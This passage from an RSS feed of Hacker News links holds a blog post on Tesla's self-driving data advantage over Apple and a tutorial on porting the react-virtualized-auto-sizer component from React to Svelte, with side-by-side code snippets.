
                </section>
              </main>
                                      
                      </div>
        </div>
          </div>
        
  </div>
</div>

  </div></div>]]>
            </description>
            <link>https://edps.europa.eu/press-publications/press-news/press-releases/2021/edps-opinions-digital-services-act-and-digital_en</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217433</guid>
            <pubDate>Sun, 21 Feb 2021 21:32:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla’s data advantage. Can Apple, or others, keep up?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26217366">thread link</a>) | @luketaylor
<br/>
February 21, 2021 | https://scobleizer.blog/2021/02/21/teslas-data-advantage-can-apple-or-others-keep-up/ | <a href="https://web.archive.org/web/*/https://scobleizer.blog/2021/02/21/teslas-data-advantage-can-apple-or-others-keep-up/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<figure><img data-attachment-id="9216" data-permalink="https://scobleizer.blog/img_1244/" data-orig-file="https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg" data-orig-size="4032,2268" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;2.2&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 12 Pro Max&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1613840424&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;7.5&quot;,&quot;iso&quot;:&quot;20&quot;,&quot;shutter_speed&quot;:&quot;0.00078308535630384&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1244" data-image-description="" data-medium-file="https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=300" data-large-file="https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=1024" src="https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=1024" alt="" srcset="https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=1024 1024w, https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=2048 2048w, https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=150 150w, https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=300 300w, https://scobleizerblog.files.wordpress.com/2021/02/img_1244.jpeg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p><em>This is a long post. Short version: Tesla is way ahead on data collection and is pulling further ahead every day.</em></p>



<p>Do you ever think about what the cameras on a Tesla are doing? <a href="https://twitter.com/CathieDWood">Cathie Wood</a> does. She runs <a href="https://ark-funds.com/">ARK Invest</a> and has made billions by investing in disrupting companies, particularly those who use artificial intelligence. Her favorite company, she reiterated again last week on CNBC, is Tesla. </p>



<p>I do too, and go even further than she does in studying this industry (I have been studying self-driving cars for 15+ years and have <a href="https://twitter.com/i/lists/956617160733818880?s=20">a Twitter list of people and companies building autonomous cars</a>). I even count how many go by my front door. One every few minutes. No one else has a neural network of its type and no other self driving car has been seen on my street. Did you know a Tesla crosses the Golden Gate Bridge every 80 seconds or faster? Yes, that was me counting cars out there. </p>



<p>I spend hours out front every week cataloging what goes past (I have the new over-the-ears headphones from Apple and usually use them outside while walking around talking to dozens of people all over the world building the future –they absolutely rock, by the way). </p>



<p>The photo at the top of this post is the street I live on, right near Netflix’s headquarters, I just shot this on our daily walk. It is part of a multi-billion war over the future of transportation. Most people have no idea how far ahead Tesla is. Including a very smart software developer I talked with today (I won’t name him because that wouldn’t be nice).</p>



<p>Elon just wrote this over on Twitter:</p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Most people have no idea, even though there are so many FSD progress videos posted. Munro understood right away. </p><p>There will be a gap before the next release, but then it will be a step change better.</p><p>Tesla is solving a major real-world AI problem.</p></div>— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1363054845976961029?ref_src=twsrc%5Etfw">February 20, 2021</a></blockquote></div>
</div></figure>



<div><p>He’s right. When I talk with people, even techies in Silicon Valley, most have no clue just how advanced Tesla is and how fast it’s moving. Wall Street Analysts are even worse. I’ve listened to EVERY analyst and NONE except for Wood’s talks about the data the car is collecting. None have figured out that Tesla is building its own maps, or, if they have, haven’t explained what that means. (I met part of the Tesla programming team building these features and they admitted to me that they are building their own maps, more on that later for the nerds who want to get into why this matters). </p><p>She says that the data leads Tesla to doing Robotaxis, which will be highly profitable. She’s right, but that’s only one possible business that Tesla can build off of this new real-time data. Others include augmented reality worlds, GIS data to sell to businesses and cities, and new utilities that will run far ahead of Apple and Google’s abilities. More on that in a bit. These are all multi-billion-dollar businesses and is why tens of billions of dollars are being invested in autonomous technologies, including at GM, with its Cruise division (worth already about 1/3 of GM’s total market value), and Apple has leaked that it’s going to be entering the space in 2024 with an effort that will cost many billions too. </p></div>



<p>First, some basics. </p>



<figure><div>
<p><span><iframe width="1100" height="619" src="https://www.youtube.com/embed/0RlG-RIbGdQ?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div></figure>



<p><a href="https://www.youtube.com/results?search_query=tesla+fsd&amp;sp=EgIIBA%253D%253D">Go and watch some of the Tesla FSD videos on YouTube</a>. </p>



<p>You will see just how it works. A Tesla has eight cameras (most of them on the outside of the car). It also has a radar in the front bumper, and several ultrasonic sensors around the car that can see things closer, like a dog running next to the car). These are all fused together into a frame by software and then 19 different AI systems go to work figuring out where drivable road surface is, where signs are, where pedestrians and bicyclists are, and much much more. </p>



<div><p>My car shows that it can “see” about 100 yards around the car, which you can see in the FSD (FSD stands for “Full Self Driving”) videos on YouTube. </p><p>When I say “see” I mean it shows me on my screen where stop signs, lights, pedestrians, other vehicles, and even curbs and other features of the road are. </p></div>



<p>For people who don’t track the bleeding edge of computer vision (<a href="https://twitter.com/i/lists/1052973537944694784?s=20">I have a separate Twitter list of developers who are doing computer vision</a>, which is how robots, autonomous cars, and augmented reality glasses will “see” the world and figure it out) you might not realize just how good computer vision is. The folks over at <a href="https://chooch.ai/demo/">Chooch AI</a>, a new startup out of Berkeley’s computer science lab, have shown me just how good computer vision is and how much cheaper it is getting literally every month. Their system can be trained to do a variety of things with cameras, even see if you are washing your hands properly (important if you are a restaurant worker or a surgeon). </p>



<p>Their system already recognizes 200,000 objects. On an iPhone. </p>



<p>My Tesla doesn’t show that it recognizes that many things, but what it does is amazing. For instance, if I drive by a traffic cone at 90 m.p.h. it shows the cone. If there are a string of cones my car automatically changes lanes to get away from the construction area and make it safer for everyone.</p>



<p>As I drive down the street it shows parked cars, and, even, garbage cans. But it isn’t showing me the “real” can. It’s showing me what the AI has in its system. This is very important. A lot of people don’t understand just how much data just one garbage can generate. It captures what kind of can it is. How big is it? How is it positioned in 3D space on the road bed? And it does this even on garbage days when there are hundreds of cans out on the street I live on. </p>



<p>Why would this data be valuable? Well, a garbage company might want to buy an autonomous garbage truck. They could use these systems to both drive the truck and have a robot figure out where each can is to pick it up (already our garbage trucks only have one person controlling such a robot). It will soon go way further than that. </p>



<figure><img data-attachment-id="9228" data-permalink="https://scobleizer.blog/img_0826/" data-orig-file="https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg" data-orig-size="4032,2268" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;2.2&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 12 Pro Max&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1611418160&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;7.5&quot;,&quot;iso&quot;:&quot;125&quot;,&quot;shutter_speed&quot;:&quot;0.0082644628099174&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_0826" data-image-description="" data-medium-file="https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=300" data-large-file="https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=1024" src="https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=1024" alt="" srcset="https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=1024 1024w, https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=2048 2048w, https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=150 150w, https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=300 300w, https://scobleizerblog.files.wordpress.com/2021/02/img_0826.jpeg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p><strong>Why “HD” Maps are So Important</strong></p>



<p>Tesla’s current autopilot/self driving systems have some major flaws (many of these are fixed in the FSD beta, but most owners don’t have that yet):</p>



<ol><li>They can’t see debris in the road.</li><li>They can’t see potholes that have just formed.</li><li>They can’t join together to make energy usage more efficient.</li><li>They can’t see around corners very well.</li></ol>



<p>Now, there are two approaches. One is to put a LOT more cameras and sensors on the car and a LOT more silicon in each car to properly identify things. I hear that will be Apple’s approach, which is why it’s currently looking at LIDAR sensors and I met the LG camera team while touring the Tesla factory, of all such places (they make the cameras in your iPhone) and they said their cameras will soon be a LOT higher resolution than the ones in my three-year-old Tesla. Apple believes it will be able to put a lot more neural network capabilities into each car since it has its own chip manufacturing now. </p>



<p>Disclaimer, I own both Tesla and Apple stock, my number one and two positions.</p>



<p>So, could Apple “beat” Tesla? That is the $64 billion question. I don’t believe so. The photo above shows why.</p>



<p>In Silicon Valley there are already so many Teslas that scenes like this one, on HWY 17 between Los Gatos and Santa Cruz, are quite common. Tesla, I hear, will soon start transmitting data from cars in front of you to your car (and to everyone else too). </p>



<p>Why is this important? Well, one day I was driving in the fast lane of Freeway 85 using my car’s Autopilot/FSD features (my car automatically changes lanes, stops, and basically drives itself already, particularly well on freeways with the above limitations). Cars in front of me started swerving and breaking. Turned out a bucket had fallen out of a truck and was rolling around lane #1 (where I was had three lanes). </p>



<p>I grabbed the steering wheel and took control, also swerving around the bucket. My Tesla hadn’t seen the bucket, although was already assisting me in driving. Doing very advanced braking. Audi taught me just how good anti-lock and traction control systems are by teaching me to drive on ice. They turned those systems off and I instantly spun the car. Turned them on and they were independently braking each wheel to keep my car from losing traction. Something Elon Musk demonstrated to me with electric engines and traction, too (which is why Teslas are REMARKABLE on ice and snow). </p>



<p>Afterward I talked with the programming team and my car, they said, automatically captures TONS of data during such an event (we call that an intervention, because a human had to intervene in autonomous driving and take over). The programmers have a simulator where they can load all that data and actually “walk around” what happened. Chooch shows that the training is so good that an engineer could just circle the bucket and “teach” the AI systems about what that is. </p>



<p>That’s how they taught it to see stop signs and garbage cans, for instance. </p>



<p>So, now a future version of a Tesla will be able to see the bucket and let everyone else know that there’s an object in the road. “But Waze already does that,” you might say. No it doesn’t. Waze requires a human to tap the screen and say there’s an object on the road. But it doesn’t know whether it’s a bucket, a box, a bedspring, or a beam. And it doesn’t show what lane that thing is in. It certainly doesn’t predict, or track, how said object is moving.</p>



<p>I hear that by the end of the year Tesla will turn on such features. Now, what will that look like on the road? All Teslas will start switching lanes to lane #3. You won’t even know why, even if you are in one, until you pass by the bucket in lane #1. </p>



<p>Can Apple match this? Not until it gets a decent amount of cars on the road. Since Apple is aiming at 2024 I think it will be way behind and will find it difficult to catch up.</p>



<p>But it might get worse for Apple, and certainly will get worse for car companies that don’t have these capabilities being built. Why? Maps and Robotoxis. </p>



<p><strong>The next trillion-dollar …</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://scobleizer.blog/2021/02/21/teslas-data-advantage-can-apple-or-others-keep-up/">https://scobleizer.blog/2021/02/21/teslas-data-advantage-can-apple-or-others-keep-up/</a></em></p>]]>
            </description>
            <link>https://scobleizer.blog/2021/02/21/teslas-data-advantage-can-apple-or-others-keep-up/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26217366</guid>
            <pubDate>Sun, 21 Feb 2021 21:24:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Porting a React library 1:1 to Svelte – It might be easier than you think]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26217119">thread link</a>) | @micha-lmxt
<br/>
February 21, 2021 | https://gradientdescent.de/porting-react | <a href="https://web.archive.org/web/*/https://gradientdescent.de/porting-react">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Svelte lures developers with the promise of better performance and smaller bundle size than competitors like React. But, since it is new, its eco-system is small. Let's change that!
    </p>
<p>There are many differences between Svelte and React. Svelte is a compiler, while React lives in the browser. Svelte components are written into '.svelte' files, while React uses <code><code>jsx</code></code>/<code><code>tsx</code></code>. React has the virtual DOM while, Svelte doesn't. So, are these frameworks so different, that we have to write every library from scratch?
    </p>
<p>No.
    </p>
<p>I took a React library, which I like, and translated it to Svelte. It is a good excercise to see what the real differences between React and Svelte are, and to see which concepts are related. The library I chose is <a href="https://github.com/bvaughn/react-virtualized-auto-sizer"><code><code>react-virtualized-auto-sizer</code></code></a>. It has unimpressive 295 stars as a standalone library at github, but it belongs to the <code><code>react-virtualized</code></code> library, which is currently at 21 thousand stars. For comparison, the highest rated Svelte specific library besides Svelte and Sapper is <code><code>svelte-material-ui</code></code> with 1.5k stars. The <code><code>auto-sizer</code></code> allows your component to grow or shrink to the available space on your page.
    </p>
<img alt="An image of a port, with a ship and a crane." title="Port" src="https://gradientdescent.de/images/port.jpg">
<h2 id="PortingAuto-Sizer">Porting Auto-Sizer
    </h2>

<blockquote>
      
    </blockquote>
<p>The library <code><code>react-virtualized-auto-sizer</code></code> has only one exported component, so it is quite a low-hanging fruit to port. It is older, so it is implemented as a React class component. React component have more lifecycle methods than in Svelte, so it may be hard or impossible to reproduce the same behavior. In this case it will be no problem.
    </p>

<h3 id="AutoSizercomponent">AutoSizer component
    </h3>

<p>There are only two files of interest in the library. The first file is <code><code>src/vendor/detectElementResize.js</code></code> and it contains only code, that is independent of React. So, I could simply copy it into my project. The other file is <code><code>src/index.js</code></code>. The author used <a href="https://flow.org/">Flow</a> for static type checking, so it starts with a lot of type definitions. Other than that, the file just holds the component source code.
    </p>
<p>In the root of my new project <a href="https://github.com/micha-lmxt/svelte-virtualized-auto-sizer"><code><code>svelte-virtualized-auto-sizer</code></code></a> I create a file <code><code>AutoSizer.svelte</code></code>.
    </p>
<h4 id="Props">Props
    </h4>

<p>First, in the scripts part I've put all props of the React component, except children and style. Both of these are handled a bit differently in Svelte. Some of the props have a default, so I copied that over:
    </p>
<pre><p><code><span><span>/// react-virtualized-auto-sizer/src/index.js</span></span>
<span><span>export</span><span> </span><span>default</span><span> </span><span>class</span><span> </span><span>AutoSizer</span><span> </span><span>extends</span><span> React</span><span>.</span><span>PureComponent</span><span>&lt;</span><span>Props</span><span>,</span><span> State</span><span>&gt;</span><span> </span><span>{</span></span>
<span><span>    </span><span>static</span><span> defaultProps </span><span>=</span><span> </span><span>{</span></span>
<span><span>        </span><span>onResize</span><span>:</span><span> </span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>{},</span></span>
<span><span>        </span><span>disableHeight</span><span>:</span><span> </span><span>false</span><span>,</span></span>
<span><span>        </span><span>disableWidth</span><span>:</span><span> </span><span>false</span><span>,</span></span>
<span><span>        </span><span>style</span><span>:</span><span> </span><span>{},</span></span>
<span><span>    </span><span>}</span><span>;</span></span>
<span><span>    </span><span>...</span></span></code></p>
      
    </pre>
<p>This becomes the following:
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>&lt;script&gt;</span></span>
<span><span>    export let onResize = () =&gt; </span><span>{}</span><span>;</span></span>
<span><span>    export let disableHeight = false;</span></span>
<span><span>    export let disableWidth = false;</span></span>
<span><span>    export let className = "";</span></span>
<span><span>    export let defaultHeight = undefined;</span></span>
<span><span>    export let defaultWidth = undefined;</span></span>
<span><span>    export let nonce = undefined;</span></span>
<span><span>    ...</span></span>
<span><span>&lt;/script&gt;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<h4 id="State">State
    </h4>

<p>The React component defines a state variable and a few class member:
    </p>
<pre><p><code><span><span>/// react-virtualized-auto-sizer/src/index.js</span></span>
<span><span>...</span></span>
<span><span>  </span><span>state</span><span> </span><span>=</span><span> </span><span>{</span></span>
<span><span>    </span><span>height</span><span>:</span><span> </span><span>this</span><span>.</span><span>props</span><span>.</span><span>defaultHeight</span><span> </span><span>||</span><span> </span><span>0</span><span>,</span></span>
<span><span>    </span><span>width</span><span>:</span><span> </span><span>this</span><span>.</span><span>props</span><span>.</span><span>defaultWidth</span><span> </span><span>||</span><span> </span><span>0</span><span>,</span></span>
<span><span>  </span><span>}</span><span>;</span></span>

<span><span>  _parentNode</span><span>:</span><span> </span><span>?</span><span>HTMLElement</span><span>;</span></span>
<span><span>  </span><span>_autoSizer</span><span>:</span><span> </span><span>?</span><span>HTMLElement</span><span>;</span></span>
<span><span>  </span><span>_detectElementResize</span><span>:</span><span> </span><span>DetectElementResize</span><span>;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<p>which both become simple state variables in Svelte:
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>...</span></span>
<span><span>  </span><span>let</span><span> </span><span>height</span><span> </span><span>=</span><span> </span><span>defaultHeight</span><span> </span><span>||</span><span> </span><span>0</span><span>,</span></span>
<span><span>        </span><span>width</span><span> </span><span>=</span><span> </span><span>defaultWidth</span><span> </span><span>||</span><span> </span><span>0</span><span>;</span></span>
<span><span>  </span><span>let</span><span> </span><span>_parentNode</span><span>,</span><span> </span><span>_autoSizer</span><span>,</span><span> </span><span>_detectElementResize</span><span>;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>

<h4 id="componentDidMountandcomponentWillUnmount">componentDidMount and componentWillUnmount
    </h4>

<p>The code from the <code><code>componentDidMount</code></code> and <code><code>componentWillUnmount</code></code> member functions is put into Sveltes <code><code>onMount</code></code> and <code><code>onDestroy</code></code> callbacks respecitvely.
    </p>
<pre><p><code><span><span>/// react-virtualized-auto-sizer/src/index.js</span></span>
<span><span>...</span></span>
<span><span>componentDidMount</span><span>() </span><span>{</span></span>
<span><span>    </span><span>const</span><span> </span><span>{</span><span>nonce</span><span>}</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>props</span><span>;</span></span>
<span><span>    </span><span>if</span><span> (</span></span>
<span><span>      </span><span>this</span><span>.</span><span>_autoSizer</span><span> </span><span>&amp;&amp;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<p>The variable unloading (<code><code>const {nonce}...</code></code>) is deleted and also all <code><code>this</code></code>-s are also removed (thank you vs-code find-and-replace function :) ):
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>...</span></span>
<span><span>    </span><span>onMount</span><span>(</span><span>()</span><span> </span><span>=&gt;</span><span> </span><span>{</span></span>
<span><span>        </span><span>if</span><span> (</span></span>
<span><span>            </span><span>_autoSizer</span><span> </span><span>&amp;&amp;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<h4 id="_onResize">_onResize
    </h4>

<p>The "<code><code>_onResize = () =&gt; {...</code></code>" member becomes a const function "<code><code>const _onResize = () =&gt; {...</code></code>". Again, props unloading is deleted. The React component uses <code><code>width</code></code> and <code><code>height</code></code> again, so I had to rename the new consts to <code><code>width_</code></code> and <code><code>height_</code></code>. And the <code><code>setState</code></code> part is changed:
    </p>
<pre><p><code><span><span>/// react-virtualized-auto-sizer/src/index.js</span></span>
<span><span>...</span></span>
<span><span>    </span><span>if</span><span> (</span></span>
<span><span>        (</span><span>!</span><span>disableHeight</span><span> </span><span>&amp;&amp;</span><span> </span><span>this</span><span>.</span><span>state</span><span>.</span><span>height</span><span> </span><span>!==</span><span> </span><span>newHeight</span><span>) </span><span>||</span></span>
<span><span>        (</span><span>!</span><span>disableWidth</span><span> </span><span>&amp;&amp;</span><span> </span><span>this</span><span>.</span><span>state</span><span>.</span><span>width</span><span> </span><span>!==</span><span> </span><span>newWidth</span><span>)</span></span>
<span><span>      ) </span><span>{</span></span>
<span><span>        </span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span></span>
<span><span>          </span><span>height</span><span>:</span><span> </span><span>height</span><span> </span><span>-</span><span> </span><span>paddingTop</span><span> </span><span>-</span><span> </span><span>paddingBottom</span><span>,</span></span>
<span><span>          </span><span>width</span><span>:</span><span> </span><span>width</span><span> </span><span>-</span><span> </span><span>paddingLeft</span><span> </span><span>-</span><span> </span><span>paddingRight</span><span>,</span></span>
<span><span>        </span><span>}</span><span>)</span><span>;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<p>to simple assignment:
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>...</span></span>
<span><span>    </span><span>if</span><span> (</span></span>
<span><span>        (</span><span>!</span><span>disableHeight</span><span> </span><span>&amp;&amp;</span><span> </span><span>height</span><span> </span><span>!==</span><span> </span><span>newHeight</span><span>) </span><span>||</span></span>
<span><span>        (</span><span>!</span><span>disableWidth</span><span> </span><span>&amp;&amp;</span><span> </span><span>width</span><span> </span><span>!==</span><span> </span><span>newWidth</span><span>)</span></span>
<span><span>    ) </span><span>{</span></span>
<span><span>        </span><span>height</span><span> </span><span>=</span><span> </span><span>height_</span><span> </span><span>-</span><span> </span><span>paddingTop</span><span> </span><span>-</span><span> </span><span>paddingBottom</span><span>;</span></span>
<span><span>        </span><span>width</span><span> </span><span>=</span><span> </span><span>width_</span><span> </span><span>-</span><span> </span><span>paddingLeft</span><span> </span><span>-</span><span> </span><span>paddingRight</span><span>;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<h4 id="render">render
    </h4>

<p>So far, there have been no significant changes. Syntax is a little bit different, but not much. For the <code><code>render</code></code> function we got a little more to do. Let's break this down to four steps.
    </p>
<p>Step 1 - Styling: The React code defines a <code><code>outerStyle</code></code> object
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>...</span></span>
<span><span>  </span><span>render</span><span>() </span><span>{</span></span>
<span><span>   </span><span>...</span></span>
<span><span>    </span><span>const</span><span> </span><span>outerStyle</span><span>:</span><span> Object </span><span>=</span><span> </span><span>{</span><span>overflow</span><span>:</span><span> </span><span>'</span><span>visible</span><span>'</span><span>}</span><span>;</span></span>
<span><span>    </span><span>...</span></span></code></p>
      
    </pre>
<p>and in the code the height and the width of this style object can be set to 0. In Svelte, inline styling is not supplied as an object, but as a string. An equivalent implementation is straight forward, but I take a different route here, since Svelte makes it easier to avoid inline styling. I create two boolean variables <code><code>let outerstylewidth = false, outerstyleheight = false</code></code>, which are set to true, when the <code><code>width</code></code> or <code><code>height</code></code> style would have been set to 0 by the React component. Then I add the following style element to the <code><code>.svelte</code></code> file and make the two classes conditional with the <a href="https://svelte.dev/tutorial/classes"><code><code>class:</code></code> directive</a>:
    </p>
<pre><p><code><span><span>...</span></span>
<span><span>&lt;style&gt;</span></span>
<span><span>    div {</span></span>
<span><span>        overflow: visible;</span></span>
<span><span>    }</span></span>
<span><span>    .outerstylewidth {</span></span>
<span><span>        width:0;</span></span>
<span><span>    }</span></span>
<span><span>    .outerstyleheight{</span></span>
<span><span>        height:0;</span></span>
<span><span>    }</span></span>
<span><span>&lt;/style&gt;</span></span>

<span><span>&lt;div class={className} class:outerstylewidth class:outerstyleheight bind:this={_autoSizer}&gt;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<p>Step 2 - ref -&gt; bind: I use the The <a href="https://svelte.dev/tutorial/bind-this"><code><code>bind:this</code></code> directive</a> as an exchange for the <code><code>ref</code></code>-logic. Note that this makes the <code><code>_setRef</code></code> member function unecessary.
    </p>

<p>Step 3 - make render code reactive: The logic part of the <code><code>render</code></code> function is marked as reactive, since it is called each time something changes:
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>    </span><span>const</span><span> </span><span>childParams</span><span>:</span><span> Object </span><span>=</span><span> </span><span>{}</span><span>;</span></span>

<span><span>    </span><span>// Avoid rendering children before the initial measurements have been collected.</span></span>
<span><span>    </span><span>// At best this would just be wasting cycles.</span></span>
<span><span>    </span><span>let</span><span> </span><span>bailoutOnChildren</span><span> </span><span>=</span><span> </span><span>false;</span></span>

<span><span>    </span><span>if</span><span> (</span><span>!</span><span>disableHeight</span><span>) </span><span>{</span></span>
<span><span>      </span><span>if</span><span> (</span><span>height</span><span> </span><span>===</span><span> </span><span>0</span><span>) </span><span>{</span></span>
<span><span>        </span><span>bailoutOnChildren</span><span> </span><span>=</span><span> </span><span>true;</span></span>
<span><span>      </span><span>}</span></span>
<span><span>      </span><span>outerStyle</span><span>.</span><span>height</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span></span>
<span><span>      </span><span>childParams</span><span>.</span><span>height</span><span> </span><span>=</span><span> </span><span>height</span><span>;</span></span>
<span><span>    </span><span>}</span></span>

<span><span>    </span><span>if</span><span> (</span><span>!</span><span>disableWidth</span><span>) </span><span>{</span></span>
<span><span>      </span><span>if</span><span> (</span><span>width</span><span> </span><span>===</span><span> </span><span>0</span><span>) </span><span>{</span></span>
<span><span>        </span><span>bailoutOnChildren</span><span> </span><span>=</span><span> </span><span>true;</span></span>
<span><span>      </span><span>}</span></span>
<span><span>      </span><span>outerStyle</span><span>.</span><span>width</span><span> </span><span>=</span><span> </span><span>0</span><span>;</span></span>
<span><span>      </span><span>childParams</span><span>.</span><span>width</span><span> </span><span>=</span><span> </span><span>width</span><span>;</span></span>
<span><span>    </span><span>}</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<p>To:
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>...</span></span>
<span><span>    </span><span>const</span><span> </span><span>childParams</span><span> </span><span>=</span><span> </span><span>{}</span><span>;</span></span>

<span><span>    </span><span>// Avoid rendering children before the initial measurements have been collected.</span></span>
<span><span>    </span><span>// At best this would just be wasting cycles.</span></span>
<span><span>    </span><span>let</span><span> </span><span>bailoutOnChildren</span><span> </span><span>=</span><span> </span><span>false</span><span>,</span><span>  </span><span>outerstylewidth</span><span> </span><span>=</span><span> </span><span>false</span><span>,</span><span> </span><span>outerstyleheight</span><span> </span><span>=</span><span> </span><span>false;</span></span>

<span><span>    $</span><span>:</span><span> </span><span>{</span></span>
<span><span>        </span><span>bailoutOnChildren</span><span> </span><span>=</span><span> </span><span>false;</span></span>
<span><span>        </span><span>if</span><span> (</span><span>!</span><span>disableHeight</span><span>) </span><span>{</span></span>
<span><span>            </span><span>if</span><span> (</span><span>height</span><span> </span><span>===</span><span> </span><span>0</span><span>) </span><span>{</span></span>
<span><span>                </span><span>bailoutOnChildren</span><span> </span><span>=</span><span> </span><span>true;</span></span>
<span><span>            </span><span>}</span></span>
<span><span>            </span><span>outerstyleheight</span><span> </span><span>=</span><span> </span><span>true;</span></span>
<span><span>            </span><span>childParams</span><span>.</span><span>height</span><span> </span><span>=</span><span> </span><span>height</span><span>;</span></span>
<span><span>        </span><span>}</span></span>

<span><span>        </span><span>if</span><span> (</span><span>!</span><span>disableWidth</span><span>) </span><span>{</span></span>
<span><span>            </span><span>if</span><span> (</span><span>width</span><span> </span><span>===</span><span> </span><span>0</span><span>) </span><span>{</span></span>
<span><span>                </span><span>bailoutOnChildren</span><span> </span><span>=</span><span> </span><span>true;</span></span>
<span><span>            </span><span>}</span></span>
<span><span>            </span><span>outerstylewidth</span><span> </span><span>=</span><span> </span><span>true;</span></span>
<span><span>            </span><span>childParams</span><span>.</span><span>width</span><span> </span><span>=</span><span> </span><span>width</span><span>;</span></span>
<span><span>        </span><span>}</span></span>
<span><span>    </span><span>}</span></span>
<span><span>&lt;/</span><span>script</span><span>&gt;</span></span>
<span><span>...</span></span></code></p>
      
    </pre>
<p>Step 4 return -&gt; html: Finally, the return statement
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>...</span></span>
<span><span>    </span><span>return</span><span> (</span></span>
<span><span>      </span><span>&lt;div</span></span>
<span><span>        </span><span>className</span><span>={</span><span>className</span><span>}</span></span>
<span><span>        </span><span>ref</span><span>={this</span><span>.</span><span>_setRef</span><span>}</span></span>
<span><span>        </span><span>style</span><span>={</span><span>{</span></span>
<span><span>          </span><span>...</span><span>outerStyle</span><span>,</span></span>
<span><span>          </span><span>...</span><span>style</span><span>,</span></span>
<span><span>        </span><span>}</span><span>}&gt;</span></span>
<span><span>        </span><span>{!</span><span>bailoutOnChildren</span><span> </span><span>&amp;&amp;</span><span> </span><span>children</span><span>(</span><span>childParams</span><span>)</span><span>}</span></span>
<span><span>      </span><span>&lt;/div&gt;</span></span>
<span><span>    )</span><span>;</span></span></code></p>
      
    </pre>
<p>is straight forward translated to this code. The <code><code>{#if}</code></code> statement replaces the <code><code>{...&amp;&amp;...}</code></code> part and children translate to slot:
    </p>
<pre><p><code><span><span>/// svelte-virtualized-auto-sizer/index.js</span></span>
<span><span>...</span></span>
<span><span>...</span></span>
<span><span>&lt;div</span><span> </span><span>class</span><span>={</span><span>className</span><span>}</span><span> </span><span>class</span><span>:</span><span>outerstylewidth</span><span> </span><span>class</span><span>:</span><span>outerstyleheight</span><span> </span><span>bind</span><span>:</span><span>this</span><span>={</span><span>_autoSizer</span><span>}&gt;</span></span>
